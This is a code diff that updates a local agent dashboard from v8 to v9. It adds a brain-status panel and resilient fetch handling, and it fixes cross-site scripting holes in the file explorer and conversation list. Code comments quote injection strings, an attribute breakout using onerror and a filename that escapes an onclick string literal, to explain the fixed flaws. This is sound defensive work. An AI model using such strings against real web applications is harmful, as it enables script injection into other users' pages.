@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<title>Sentinel Command Center v8</title>
+<title>Sentinel Command Center v9</title>
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
 
@@ -573,6 +573,9 @@ body::before {
 }
 
 #sdot.err { background: var(--err); box-shadow: 0 0 8px var(--err); }
+/* "degraded" = we reached the service and it reported itself unhealthy (503),
+   which is a different situation from not reaching it at all. */
+#sdot.warn { background: var(--warn); box-shadow: 0 0 8px var(--warn); }
 #sdot.act {
   background: var(--accent);
   box-shadow: 0 0 8px var(--accent);
@@ -732,6 +735,7 @@ body::before {
 .msg.u { align-self: flex-end; flex-direction: row-reverse; }
 .msg.a { align-self: flex-start; }
 .msg.s { align-self: center; max-width: 70%; }
+.msg.e { align-self: flex-start; }
 
 .mav {
   width: 28px;
@@ -747,6 +751,7 @@ body::before {
 
 .msg.u .mav { background: var(--grad); }
 .msg.a .mav { background: var(--accent-soft); border: 1px solid var(--border); }
+.msg.e .mav { background: rgba(255,68,102,.12); border: 1px solid rgba(255,68,102,.45); }
 
 .mb {
   padding: 8px 12px;
@@ -777,6 +782,35 @@ body::before {
   text-align: center;
   border-radius: 8px;
 }
+
+/* Errors used to fall through to assistant styling, so a failed request looked
+   exactly like a normal model reply. Give them their own unmistakable look. */
+.msg.e .mb {
+  background: rgba(255,68,102,.09);
+  border: 1px solid rgba(255,68,102,.45);
+  border-left: 3px solid var(--err);
+  color: #ffb3c1;
+  border-bottom-left-radius: 4px;
+}
+
+/* ── Brain Lab key/value rows ── */
+.bl-k {
+  font-size: .62rem;
+  color: var(--muted);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+}
+
+.bl-v {
+  font-size: .82rem;
+  color: var(--text);
+  margin-top: 2px;
+  word-break: break-word;
+}
+
+#brain-badge.ok { color: var(--ok); border-color: rgba(0,255,136,.45); }
+#brain-badge.warn { color: var(--warn); border-color: rgba(255,204,68,.45); }
+#brain-badge.err { color: var(--err); border-color: rgba(255,68,102,.45); }
 
 /* ── Input Area ── */
 #inp-area {
@@ -1401,7 +1435,7 @@ button:focus-visible, input:focus-visible, select:focus-visible, textarea:focus-
   <aside id="sidebar" role="navigation" aria-label="Conversation history">
     <div id="sb-logo">
       <div class="logo-name">SENTINEL</div>
-      <div class="logo-sub">Command Center v8</div>
+      <div class="logo-sub">Command Center v9</div>
     </div>
 
     <nav id="sb-nav">
@@ -1504,7 +1538,7 @@ button:focus-visible, input:focus-visible, select:focus-visible, textarea:focus-
       <div class="pg on" id="pg-chat">
         <div id="chat-area">
           <div id="msgs" role="log" aria-live="polite">
-            <div class="msg s"><div class="mb">Sentinel Command Center v8 — Ready. Describe a goal and press Enter.</div></div>
+            <div class="msg s"><div class="mb">Sentinel Command Center v9 — Ready. Describe a goal and press Enter.</div></div>
           </div>
           <div id="inp-area">
             <div class="inp-row">
@@ -1543,6 +1577,33 @@ button:focus-visible, input:focus-visible, select:focus-visible, textarea:focus-
             <div style="font-size:.68rem;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-top:2px">Version</div>
           </div>
         </div>
+
+        <!-- ── Neuralis brain panel (v9) ──
+             Fed by the brain API on :8001. Never :8000 — that port only answers
+             through an undocumented netsh portproxy and is not a real listener.
+             Every field below is one that /health, /brain/stats or
+             /brain/diagnostics was verified to actually return. -->
+        <div style="margin-top:14px;background:var(--surface);border:1px solid var(--border);border-radius:var(--r);padding:14px">
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px">
+            <span style="font-size:1.1rem">🧠</span>
+            <span style="font-size:.8rem;font-weight:700;letter-spacing:.5px">NEURALIS BRAIN</span>
+            <span id="brain-badge" style="margin-left:auto;font-size:.64rem;text-transform:uppercase;letter-spacing:1px;padding:2px 8px;border-radius:99px;border:1px solid var(--border);color:var(--muted)">checking…</span>
+          </div>
+          <div id="brain-endpoint" style="font-size:.66rem;color:var(--muted);margin-bottom:10px">http://localhost:8001</div>
+          <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:8px">
+            <div><div class="bl-k">Status</div><div class="bl-v" id="bl-status">—</div></div>
+            <div><div class="bl-k">Active pack</div><div class="bl-v" id="bl-pack">—</div></div>
+            <div><div class="bl-k">Storage</div><div class="bl-v" id="bl-storage">—</div></div>
+            <div><div class="bl-k">Uptime</div><div class="bl-v" id="bl-uptime">—</div></div>
+            <div><div class="bl-k">DB size</div><div class="bl-v" id="bl-db">—</div></div>
+            <div><div class="bl-k">WAL</div><div class="bl-v" id="bl-wal">—</div></div>
+            <div><div class="bl-k">Embedding model</div><div class="bl-v" id="bl-embmodel">—</div></div>
+            <div><div class="bl-k">Vectors</div><div class="bl-v" id="bl-vectors">—</div></div>
+            <div><div class="bl-k">Lock retries / drops</div><div class="bl-v" id="bl-locks">—</div></div>
+            <div><div class="bl-k">Top region</div><div class="bl-v" id="bl-topregion">—</div></div>
+          </div>
+          <button class="top-btn" id="brain-refresh" style="margin-top:12px">↻ Refresh brain</button>
+        </div>
       </div>
 
     </div>
@@ -1564,7 +1625,9 @@ button:focus-visible, input:focus-visible, select:focus-visible, textarea:focus-
     <div id="fe-header">
       <div id="fe-title">📁 File Explorer</div>
       <div id="fe-breadcrumb">
-        <span class="bc-item" onclick="navigateTo('C:\\')">C:</span>
+        <!-- Handler attached in setupStaticHandlers(); an inline onclick here
+             would double-fire alongside it. -->
+        <span class="bc-item">C:</span>
       </div>
     </div>
     <div id="fe-tree" role="tree" aria-label="Directory tree">
@@ -1605,6 +1668,10 @@ button:focus-visible, input:focus-visible, select:focus-visible, textarea:focus-
 
 // ═══════════ STATE ═══════════
 const API = 'http://localhost:8091';
+// Neuralis brain API. Must be 8001: port 8000 only ever answered via an
+// undocumented `netsh interface portproxy` rule, so it is not a dependable
+// endpoint and must never be hardcoded here.
+const BRAIN_API = 'http://localhost:8001';
 let abort = null;
 let streaming = false;
 let convId = null;
@@ -1612,6 +1679,159 @@ let allModels = [];
 let currentPath = 'C:\\';
 let sidebarCollapsed = false;
 let rightCollapsed = false;
+
+// Cap on rendered chat messages. Both appendMsg() and the WebSocket handler
+// funnel through appendMsg, and neither used to bound #msgs, so a long-running
+// or chatty agent session grew the DOM until the tab crawled.
+const MAX_MESSAGES = 300;
+
+// ═══════════ ESCAPING (mirrored from web/lib/dash-escape.js) ═══════════
+// This dashboard has to stay a single self-contained file that works from
+// file://, so it cannot `import` the shared module. The block below is a
+// verbatim mirror of the marked region in web/lib/dash-escape.js;
+// tests/web-dash-escape.test.js fails the build if the two copies drift.
+
+// ─── BEGIN dash-escape shared block ───
+
+// Escape a value for interpolation into HTML text OR into a QUOTED HTML
+// attribute value (single- or double-quoted).
+//
+// The pre-v9 helper was `d.textContent = str; return d.innerHTML`, which the
+// HTML spec only requires to escape `&`, `<` and `>`. That is safe for text
+// nodes and unsafe for attributes: `x" onerror=alert(1) y="` survived it
+// untouched and broke straight out of `<img alt="...">`.
+//
+// INVARIANT: callers must always place the result inside quotes. This helper
+// does not escape `=` or whitespace, so an UNQUOTED attribute is still
+// exploitable. Never write `<div data-x=${escHtml(v)}>`.
+//
+// This is NOT sufficient for a JavaScript code context. Do not interpolate the
+// result into `onclick="fn('...')"` — attach listeners with addEventListener
+// and close over the raw value instead, so untrusted text never becomes code.
+function escHtml(value) {
+  if (value === null || value === undefined) return '';
+  return String(value)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;')
+    .replace(/`/g, '&#96;');
+}
+
+// Alias that documents intent at attribute call sites. Same implementation:
+// the six-character escape set is simultaneously correct for text and for
+// quoted attributes, and one shared code path means one thing to audit.
+const escAttr = escHtml;
+
+// Only base64 raster images. `image/svg+xml` is deliberately absent: an SVG can
+// carry <script> and event handlers, so a "valid" SVG data URI is still an XSS
+// vector when handed to <img> in some contexts and to navigation in others.
+// The non-base64 `data:image/png,<payload>` form is also rejected, because its
+// payload is unencoded and can contain quotes.
+const SAFE_IMAGE_DATA_URI_RE =
+  /^data:image\/(?:png|jpeg|jpg|gif|webp|bmp|avif|x-icon);base64,[A-Za-z0-9+/=\s]+$/i;
+
+// 8 MiB of base64 — comfortably above any real screenshot, low enough that a
+// hostile response cannot wedge the renderer.
+const MAX_IMAGE_DATA_URI_LENGTH = 8 * 1024 * 1024;
+
+function isSafeImageDataUri(value) {
+  if (typeof value !== 'string') return false;
+  if (value.length === 0 || value.length > MAX_IMAGE_DATA_URI_LENGTH) return false;
+  return SAFE_IMAGE_DATA_URI_RE.test(value);
+}
+
+// ─── END dash-escape shared block ───
+
+// ═══════════ RESILIENT DATA LAYER ═══════════
+// Every request goes through here so that no call site can forget a timeout or
+// an res.ok check. Failures are classified, because "unreachable" and
+// "reachable but unhealthy" need different words in the UI:
+//   'offline'  — never got a response (DNS, refused, timeout, abort)
+//   'degraded' — HTTP 503; fleet convention is an unhealthy service answers
+//                503 with a JSON body describing itself
+//   'error'    — any other non-2xx, or a body that is not the JSON we expect
+const DEFAULT_TIMEOUT_MS = 8000;
+
+function apiError(kind, status, message) {
+  const err = new Error(message);
+  err.name = 'ApiError';
+  err.kind = kind;
+  err.status = status;
+  return err;
+}
+
+async function apiFetch(url, opts) {
+  const o = opts || {};
+  const timeoutMs = o.timeoutMs || DEFAULT_TIMEOUT_MS;
+  const init = Object.assign({}, o);
+  delete init.timeoutMs;
+
+  // Always arm a timeout. If the caller also passed its own signal (the Stop
+  // button), honour both.
+  const timeoutSignal = AbortSignal.timeout(timeoutMs);
+  init.signal = o.signal && AbortSignal.any
+    ? AbortSignal.any([o.signal, timeoutSignal])
+    : (o.signal || timeoutSignal);
+
+  let res;
+  try {
+    res = await fetch(url, init);
+  } catch (exc) {
+    if (o.signal && o.signal.aborted) throw exc;   // user pressed Stop
+    throw apiError('offline', 0, exc && exc.message ? exc.message : 'Network error');
+  }
+
+  if (res.status === 503) {
+    let detail = 'service unhealthy';
+    try {
+      const body = await res.json();
+      detail = body.detail || body.status || body.error || detail;
+    } catch { /* 503 without a JSON body */ }
+    throw apiError('degraded', 503, String(detail));
+  }
+
+  if (!res.ok) {
+    throw apiError('error', res.status, 'HTTP ' + res.status);
+  }
+  return res;
+}
+
+async function apiJson(url, opts) {
+  const res = await apiFetch(url, opts);
+  try {
+    return await res.json();
+  } catch {
+    throw apiError('error', res.status, 'Malformed JSON response');
+  }
+}
+
+// Short human label for a caught error, for use in degraded-state UI.
+function errLabel(exc) {
+  if (!exc) return 'unknown error';
+  if (exc.kind === 'offline') return 'unreachable';
+  if (exc.kind === 'degraded') return 'degraded';
+  if (exc.kind === 'error') return exc.message || 'error';
+  return exc.message || 'error';
+}
+
+function formatBytes(bytes) {
+  if (typeof bytes !== 'number' || !isFinite(bytes)) return '—';
+  if (bytes < 1024) return bytes + ' B';
+  if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
+  if (bytes < 1073741824) return (bytes / 1048576).toFixed(1) + ' MB';
+  return (bytes / 1073741824).toFixed(2) + ' GB';
+}
+
+function formatDuration(seconds) {
+  if (typeof seconds !== 'number' || !isFinite(seconds)) return '—';
+  const s = Math.floor(seconds);
+  if (s < 60) return s + 's';
+  if (s < 3600) return Math.floor(s / 60) + 'm ' + (s % 60) + 's';
+  if (s < 86400) return Math.floor(s / 3600) + 'h ' + Math.floor((s % 3600) / 60) + 'm';
+  return Math.floor(s / 86400) + 'd ' + Math.floor((s % 86400) / 3600) + 'h';
+}
 
 // ═══════════ WEBSOCKET ═══════════
 let ws = null;
@@ -1650,28 +1870,47 @@ function connectWS() {
 (async function init() {
   setupInput();
   setupKeyboard();
+  setupStaticHandlers();
   loadGroupState();
-  await Promise.all([loadModels(), loadConvs(), loadBrainStats(), loadFiles(currentPath)]);
+  // allSettled, not all: one dead subsystem must not abort the others.
+  await Promise.allSettled([loadModels(), loadConvs(), loadBrainStats(), loadFiles(currentPath)]);
   ping();
   connectWS();
 })();
 
+// Wire up the handlers for statically-rendered controls. Kept out of inline
+// onclick= attributes so the page stays compatible with a strict CSP.
+function setupStaticHandlers() {
+  const refreshBtn = document.getElementById('brain-refresh');
+  if (refreshBtn) refreshBtn.addEventListener('click', () => loadBrainStats());
+  document.querySelectorAll('#fe-breadcrumb .bc-item').forEach(el => {
+    el.addEventListener('click', () => navigateTo('C:\\'));
+  });
+}
+
 // ═══════════ CONNECTIVITY ═══════════
 async function ping() {
   try {
-    const r = await fetch(API + '/status', { signal: AbortSignal.timeout(4000) });
-    if (r.ok) setDot('ok'); else throw 0;
-  } catch {
-    setDot('err');
+    await apiFetch(API + '/status', { timeoutMs: 4000 });
+    setDot('ok', 'Desktop API reachable');
+  } catch (exc) {
+    // Distinguish "answered 503, so it is up but sick" from "no answer at all".
+    if (exc.kind === 'degraded') {
+      setDot('warn', 'Desktop API degraded: ' + exc.message);
+    } else {
+      setDot('err', 'Desktop API ' + errLabel(exc));
+    }
     setTimeout(ping, 6000);
     return;
   }
   setTimeout(ping, 30000);
 }
 
-function setDot(s) {
+function setDot(s, detail) {
   const d = document.getElementById('sdot');
-  d.className = s === 'err' ? 'err' : s === 'act' ? 'act' : '';
+  d.className = s === 'err' ? 'err' : s === 'warn' ? 'warn' : s === 'act' ? 'act' : '';
+  const labels = { err: 'Offline', warn: 'Degraded', act: 'Working', ok: 'Connected' };
+  d.title = 'Status: ' + (labels[s] || 'Connected') + (detail ? ' — ' + detail : '');
 }
 
 // ═══════════ PANEL TOGGLES ═══════════
@@ -1773,15 +2012,25 @@ function filterConvs(query) {
 
 // ═══════════ MODELS ═══════════
 async function loadModels() {
+  const sel = document.getElementById('model-sel');
   try {
-    const r = await fetch(API + '/config');
-    if (!r.ok) throw 0;
-    const cfg = await r.json();
-    const sel = document.getElementById('model-sel');
-    sel.innerHTML = `<option value="${cfg.model || ''}">${cfg.model || 'No model'}</option>`;
+    const cfg = await apiJson(API + '/config');
+    // Built through the DOM rather than innerHTML: cfg.model is API-supplied and
+    // was interpolated raw into value="..." here, which is attribute-breakout
+    // territory the same way the file list was.
+    sel.textContent = '';
+    const opt = document.createElement('option');
+    opt.value = cfg.model || '';
+    opt.textContent = cfg.model || 'No model';
+    sel.appendChild(opt);
     document.getElementById('ar-tog').checked = !!cfg.auto_route;
-  } catch {
-    document.getElementById('model-sel').innerHTML = '<option value="">Unavailable</option>';
+  } catch (exc) {
+    sel.textContent = '';
+    const opt = document.createElement('option');
+    opt.value = '';
+    opt.textContent = exc.kind === 'degraded' ? 'Degraded' : 'Unavailable';
+    sel.appendChild(opt);
+    sel.title = 'Model list ' + errLabel(exc);
   }
 }
 
@@ -1825,15 +2074,23 @@ function renderConvs(convs) {
       div.className = 'conv-item' + (c.id === convId ? ' on' : '');
       div.setAttribute('role', 'option');
       div.setAttribute('tabindex', '0');
+      // The delete button used to be `onclick="...delConv('${esc(c.id)}')"`.
+      // esc() left `'` alone, so an id containing an apostrophe closed the JS
+      // string literal and the rest of the id ran as code. Now the id never
+      // enters a code context at all — the listener closes over the raw value.
       div.innerHTML = `
         <div class="conv-item-body">
-          <div class="conv-item-title">${esc(c.title || 'Untitled')}</div>
-          <div class="conv-item-meta">${timeAgo(c.updated_at || c.created_at)}${c.step_count ? ' · ' + c.step_count + ' steps' : ''}</div>
+          <div class="conv-item-title">${escHtml(c.title || 'Untitled')}</div>
+          <div class="conv-item-meta">${escHtml(timeAgo(c.updated_at || c.created_at))}${c.step_count ? ' · ' + escHtml(c.step_count) + ' steps' : ''}</div>
         </div>
-        <button class="conv-item-del" onclick="event.stopPropagation();delConv('${esc(c.id)}')" aria-label="Delete conversation">✕</button>
+        <button class="conv-item-del" aria-label="Delete conversation">✕</button>
       `;
-      div.addEventListener('click', () => openConv(c.id));
-      div.addEventListener('keydown', e => { if (e.key === 'Enter') openConv(c.id); });
+      div.querySelector('.conv-item-del').addEventListener('click', e => {
+        e.stopPropagation();
+        delConv(c.id);
+      });
+      div.addEventListener('click', () => openConv(c.id, div));
+      div.addEventListener('keydown', e => { if (e.key === 'Enter') openConv(c.id, div); });
       body.appendChild(div);
     });
   });
@@ -1851,10 +2108,13 @@ function timeAgo(dateStr) {
   return d.toLocaleDateString();
 }
 
-async function openConv(id) {
+// `el` is passed explicitly. This used to read the non-standard implicit global
+// `event`, which is absent in strict/module contexts and in non-Chromium
+// browsers, so the active-row highlight silently did nothing there.
+async function openConv(id, el) {
   convId = id;
   document.querySelectorAll('.conv-item').forEach(i => i.classList.remove('on'));
-  event?.currentTarget?.classList.add('on');
+  if (el) el.classList.add('on');
   // Phase 5: Load messages from API
   appendMsg('s', 'Loading conversation…');
 }
@@ -1866,15 +2126,101 @@ async function delConv(id) {
   loadConvs();
 }
 
-// ═══════════ BRAIN STATS ═══════════
+// ═══════════ BRAIN STATS (v9: live from the Neuralis brain on :8001) ═══════════
+// v8 fetched /dashboard/overview from the Desktop API, ignored the parsed body
+// entirely, and hardcoded the version to 'v8.0'. Neurons / Synapses / Regions
+// were only ever written in the catch block, so on a *successful* request they
+// stayed at their placeholder em-dash. The panel has therefore never worked.
+//
+// Field names below were confirmed against the live API before being used:
+//   GET /health             -> status, version, storage, pack
+//   GET /brain/stats        -> version, active_pack, totals{neurons,synapses,regions},
+//                              neurons_per_region[{region,count}]
+//   GET /brain/diagnostics  -> uptime_seconds, db{path,size_bytes,wal_bytes},
+//                              embeddings{total_vectors,model}, write_contention{lock_retries,lock_drops}
+function setText(id, value) {
+  const el = document.getElementById(id);
+  if (el) el.textContent = value === null || value === undefined || value === '' ? '—' : String(value);
+}
+
+function setBrainBadge(state, text) {
+  const b = document.getElementById('brain-badge');
+  if (!b) return;
+  b.className = state;
+  b.textContent = text;
+}
+
 async function loadBrainStats() {
+  setBrainBadge('', 'checking…');
+
+  // /brain/stats carries the counters the four hero tiles need. It is a large
+  // response, so it is fetched on demand (init + the Refresh button) rather
+  // than on a poll.
+  let stats = null;
+  let statsErr = null;
   try {
-    const r = await fetch(API + '/dashboard/overview');
-    if (!r.ok) throw 0;
-    const data = await r.json();
-    document.getElementById('sv-v').textContent = 'v8.0';
+    stats = await apiJson(BRAIN_API + '/brain/stats', { timeoutMs: 10000 });
+  } catch (exc) {
+    statsErr = exc;
+  }
+
+  if (stats && stats.totals) {
+    setText('sv-n', (stats.totals.neurons || 0).toLocaleString());
+    setText('sv-s', (stats.totals.synapses || 0).toLocaleString());
+    setText('sv-r', (stats.totals.regions || 0).toLocaleString());
+    setText('sv-v', stats.version ? 'v' + stats.version : '—');
+    setText('bl-pack', stats.active_pack);
+    const regions = Array.isArray(stats.neurons_per_region) ? stats.neurons_per_region : [];
+    const top = regions.length ? regions.reduce((a, b) => ((b.count || 0) > (a.count || 0) ? b : a)) : null;
+    setText('bl-topregion', top ? top.region + ' (' + (top.count || 0).toLocaleString() + ')' : '—');
+  } else {
+    // Degrade to a legible state instead of leaving stale numbers on screen.
+    ['sv-n', 'sv-s', 'sv-r', 'sv-v', 'bl-pack', 'bl-topregion'].forEach(id => setText(id, '—'));
+  }
+
+  let health = null;
+  let healthErr = null;
+  try {
+    health = await apiJson(BRAIN_API + '/health', { timeoutMs: 5000 });
+  } catch (exc) {
+    healthErr = exc;
+  }
+
+  if (health) {
+    setText('bl-status', health.status || 'unknown');
+    setText('bl-storage', health.storage);
+    if (!stats && health.version) setText('sv-v', 'v' + health.version);
+    if (!stats && health.pack) setText('bl-pack', health.pack);
+  } else {
+    setText('bl-status', errLabel(healthErr));
+    setText('bl-storage', '—');
+  }
+
+  try {
+    const diag = await apiJson(BRAIN_API + '/brain/diagnostics', { timeoutMs: 5000 });
+    setText('bl-uptime', formatDuration(diag.uptime_seconds));
+    setText('bl-db', diag.db ? formatBytes(diag.db.size_bytes) : '—');
+    setText('bl-wal', diag.db ? formatBytes(diag.db.wal_bytes) : '—');
+    setText('bl-embmodel', diag.embeddings ? diag.embeddings.model : '—');
+    setText('bl-vectors', diag.embeddings && typeof diag.embeddings.total_vectors === 'number'
+      ? diag.embeddings.total_vectors.toLocaleString() : '—');
+    setText('bl-locks', diag.write_contention
+      ? (diag.write_contention.lock_retries || 0) + ' / ' + (diag.write_contention.lock_drops || 0)
+      : '—');
   } catch {
-    ['sv-n','sv-s','sv-r'].forEach(id => document.getElementById(id).textContent = '—');
+    ['bl-uptime', 'bl-db', 'bl-wal', 'bl-embmodel', 'bl-vectors', 'bl-locks'].forEach(id => setText(id, '—'));
+  }
+
+  // Badge summarises the panel: healthy, reachable-but-sick, or unreachable.
+  const firstErr = healthErr || statsErr;
+  if (!firstErr && health && health.status === 'ok') {
+    setBrainBadge('ok', 'online');
+  } else if (firstErr && firstErr.kind === 'degraded') {
+    setBrainBadge('warn', 'degraded');
+  } else if (firstErr && firstErr.kind === 'offline') {
+    setBrainBadge('err', 'offline');
+  } else {
+    setBrainBadge('warn', firstErr ? errLabel(firstErr) : 'unknown');
   }
 }
 
@@ -1933,56 +2279,79 @@ async function sendMsg() {
   document.getElementById('run-btn').style.display = 'none';
   document.getElementById('sbtn').disabled = true;
 
-  // Create conversation if needed
-  if (!convId) {
-    try {
-      const r = await fetch(API + '/api/conversations', { method: 'POST' });
-      if (r.ok) convId = (await r.json()).id;
-    } catch {}
-  }
-
-  // Save user message
-  if (convId) {
-    await fetch(API + '/api/conversations/' + convId + '/messages', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ role: 'user', content: text }),
-    });
-  }
-
-  // Call the goal endpoint
-  abort = new AbortController();
+  // Everything from here on is wrapped, and the UI reset lives in `finally`.
+  // Previously the message-save fetch below sat outside any try/catch: a single
+  // network blip threw past the reset block, so `streaming` stayed true, Stop
+  // stayed visible, Run stayed hidden and #sbtn stayed disabled. The composer
+  // was then wedged until a full page reload.
   try {
-    const r = await fetch(API + '/goal', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ goal: text }),
-      signal: abort.signal,
-    });
-    if (r.ok) {
-      appendMsg('a', 'Agent is working on your request…');
-    } else {
-      appendMsg('e', 'Failed to start agent: ' + r.status);
+    // Create conversation if needed
+    if (!convId) {
+      try {
+        const created = await apiJson(API + '/api/conversations', { method: 'POST' });
+        convId = created.id;
+      } catch { /* non-fatal: continue without a conversation record */ }
     }
-  } catch (exc) {
-    if (exc.name !== 'AbortError') {
-      appendMsg('e', 'Error: ' + exc.message);
-    }
-  }
 
-  streaming = false;
-  setDot('ok');
-  document.getElementById('stop-btn').style.display = 'none';
-  document.getElementById('run-btn').style.display = '';
-  document.getElementById('sbtn').disabled = false;
+    // Save user message. Non-fatal — losing the transcript row must not stop
+    // the goal from being dispatched.
+    if (convId) {
+      try {
+        await apiFetch(API + '/api/conversations/' + convId + '/messages', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ role: 'user', content: text }),
+        });
+      } catch (exc) {
+        appendMsg('e', 'Could not save message to history (' + errLabel(exc) + ')');
+      }
+    }
+
+    // Call the goal endpoint
+    abort = new AbortController();
+    try {
+      await apiFetch(API + '/goal', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ goal: text }),
+        signal: abort.signal,
+        timeoutMs: 30000,
+      });
+      appendMsg('a', 'Agent is working on your request…');
+    } catch (exc) {
+      if (exc.name !== 'AbortError' && !(abort && abort.signal.aborted)) {
+        appendMsg('e', 'Failed to start agent: ' + errLabel(exc));
+      }
+    }
+  } finally {
+    streaming = false;
+    setDot('ok');
+    document.getElementById('stop-btn').style.display = 'none';
+    document.getElementById('run-btn').style.display = '';
+    document.getElementById('sbtn').disabled = false;
+  }
 }
+
+// Roles: 'u' user, 'a' assistant, 's' system notice, 'e' error.
+// v8 mapped every role that was not 'u' or 's' onto assistant styling, so the
+// 'e' errors raised by sendMsg rendered as if the model had said them.
+const MSG_CLASS = { u: 'u', a: 'a', s: 's', e: 'e' };
+const MSG_AVATAR = { u: '👤', a: '🤖', s: '⚙', e: '⚠' };
 
 function appendMsg(role, text) {
   const msgs = document.getElementById('msgs');
   const div = document.createElement('div');
-  div.className = 'msg ' + (role === 'u' ? 'u' : role === 's' ? 's' : 'a');
-  div.innerHTML = `<div class="mav">${role === 'u' ? '👤' : role === 's' ? '⚙' : '🤖'}</div><div class="mb">${esc(text)}</div>`;
+  div.className = 'msg ' + (MSG_CLASS[role] || 'a');
+  div.innerHTML = `<div class="mav">${MSG_AVATAR[role] || '🤖'}</div><div class="mb">${escHtml(text)}</div>`;
   msgs.appendChild(div);
+
+  // Bound the transcript. Without this, #msgs grew without limit — every
+  // appendMsg call and every inbound WebSocket message added a node forever,
+  // which is what made long agent sessions turn sluggish.
+  while (msgs.childElementCount > MAX_MESSAGES) {
+    msgs.removeChild(msgs.firstElementChild);
+  }
+
   msgs.scrollTop = msgs.scrollHeight;
 }
 
@@ -2018,24 +2387,26 @@ function getFileIcon(name, isDir) {
   return FILE_ICONS[ext] || FILE_ICONS.default;
 }
 
-function formatSize(bytes) {
-  if (bytes < 1024) return bytes + ' B';
-  if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
-  if (bytes < 1073741824) return (bytes / 1048576).toFixed(1) + ' MB';
-  return (bytes / 1073741824).toFixed(1) + ' GB';
-}
+// formatSize() was folded into the null-safe formatBytes() above; there is now
+// one byte formatter for the whole dashboard.
 
 async function loadFiles(path) {
   const tree = document.getElementById('fe-tree');
   tree.innerHTML = '<div class="fe-entry" style="color:var(--muted)"><span class="fe-entry-icon">⏳</span><span class="fe-entry-name">Loading…</span></div>';
 
   try {
-    const r = await fetch(API + '/api/files?path=' + encodeURIComponent(path));
-    if (!r.ok) throw 'Failed';
-    const data = await r.json();
+    const data = await apiJson(API + '/api/files?path=' + encodeURIComponent(path));
     renderFileTree(data.entries || [], tree);
-  } catch {
-    tree.innerHTML = '<div class="fe-entry" style="color:var(--err)"><span class="fe-entry-icon">⚠</span><span class="fe-entry-name">Failed to load directory</span></div>';
+  } catch (exc) {
+    // Say which kind of failure it was, rather than a blank or generic panel.
+    tree.textContent = '';
+    const msg = document.createElement('div');
+    msg.className = 'fe-entry';
+    msg.style.color = exc.kind === 'degraded' ? 'var(--warn)' : 'var(--err)';
+    msg.textContent = exc.kind === 'degraded'
+      ? '⚠ File service degraded: ' + exc.message
+      : '⚠ Cannot list directory (' + errLabel(exc) + ')';
+    tree.appendChild(msg);
   }
 }
 
@@ -2053,19 +2424,28 @@ function renderFileTree(entries, container) {
   });
 
   sorted.forEach(entry => {
+    // Resolve once, use the raw value in closures. `'`, `"` and backtick are all
+    // legal in Windows filenames, and these names come from the file-listing
+    // API, so this is the most reachable injection surface in the dashboard.
+    const fullPath = entry.path || (currentPath + '\\' + entry.name);
+
     const div = document.createElement('div');
     div.className = 'fe-dir';
+    // Attribute values are escaped AND quoted. The action buttons no longer
+    // carry the path at all: v8 wrote onclick="viewFile('${esc(path)}')", and
+    // because esc() did not touch `'`, a file named `x'); alert(1);//` escaped
+    // the string literal and ran as JavaScript on render.
     div.innerHTML = `
-      <div class="fe-entry" data-path="${esc(entry.path || (currentPath + '\\' + entry.name))}" data-type="${entry.type}" data-name="${esc(entry.name)}">
+      <div class="fe-entry" data-path="${escAttr(fullPath)}" data-type="${escAttr(entry.type)}" data-name="${escAttr(entry.name)}">
         <span class="fe-dir-toggle">${entry.type === 'dir' ? '▼' : ''}</span>
-        <span class="fe-entry-icon">${getFileIcon(entry.name, entry.type === 'dir')}</span>
-        <span class="fe-entry-name">${esc(entry.name)}</span>
-        <span class="fe-entry-size">${entry.size != null && entry.type !== 'dir' ? formatSize(entry.size) : ''}</span>
+        <span class="fe-entry-icon">${escHtml(getFileIcon(entry.name, entry.type === 'dir'))}</span>
+        <span class="fe-entry-name">${escHtml(entry.name)}</span>
+        <span class="fe-entry-size">${entry.size != null && entry.type !== 'dir' ? escHtml(formatBytes(entry.size)) : ''}</span>
         <div class="fe-entry-actions">
           ${entry.type !== 'dir' ? `
-            <button class="fe-action-btn" onclick="viewFile('${esc(entry.path || currentPath + '\\' + entry.name)}')" title="View">👁</button>
-            <button class="fe-action-btn" onclick="copyPath('${esc(entry.path || currentPath + '\\' + entry.name)}')" title="Copy path">📋</button>
-            <button class="fe-action-btn" onclick="downloadFile('${esc(entry.path || currentPath + '\\' + entry.name)}')" title="Download">⬇</button>
+            <button class="fe-action-btn" data-act="view" title="View">👁</button>
+            <button class="fe-action-btn" data-act="copy" title="Copy path">📋</button>
+            <button class="fe-action-btn" data-act="download" title="Download">⬇</button>
           ` : ''}
         </div>
       </div>
@@ -2075,19 +2455,30 @@ function renderFileTree(entries, container) {
     const entryEl = div.querySelector('.fe-entry');
     const childrenEl = div.querySelector('.fe-dir-children');
 
+    const actions = { view: viewFile, copy: copyPath, download: downloadFile };
+    div.querySelectorAll('.fe-action-btn').forEach(btn => {
+      btn.addEventListener('click', e => {
+        e.stopPropagation();
+        const fn = actions[btn.dataset.act];
+        if (fn) fn(fullPath);
+      });
+    });
+
     if (entry.type === 'dir') {
       entryEl.addEventListener('click', async () => {
         const isCollapsed = div.classList.toggle('collapsed');
         if (!isCollapsed && childrenEl.style.display === 'none') {
           childrenEl.style.display = 'block';
           try {
-            const r = await fetch(API + '/api/files?path=' + encodeURIComponent(entry.path || currentPath + '\\' + entry.name));
-            if (r.ok) {
-              const data = await r.json();
-              renderFileTree(data.entries || [], childrenEl);
-            }
-          } catch {
-            childrenEl.innerHTML = '<div class="fe-entry" style="color:var(--err)"><span class="fe-entry-icon">⚠</span><span class="fe-entry-name">Access denied</span></div>';
